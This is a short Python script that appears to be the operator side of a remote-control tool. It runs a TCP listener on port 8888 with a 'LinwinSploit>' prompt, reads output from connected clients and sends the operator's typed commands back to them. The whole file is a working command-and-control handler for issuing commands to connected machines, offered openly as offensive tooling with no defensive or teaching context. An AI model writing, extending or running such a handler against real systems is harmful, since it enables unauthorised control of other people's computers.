import socket

tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpserver.bind(("", 8888))
tcpserver.listen(5)
while True:
    conn, addr = tcpserver.accept()
    print(conn)
    while True:
        try:
            data = conn.recv(1024)
            print(data.decode("utf-8"))

            command = input("LinwinSploit> ").strip()
            conn.send(command.encode())

            if command == 'exit':
                conn.close()
                exit(0)
        except Exception:
            break
    conn.close()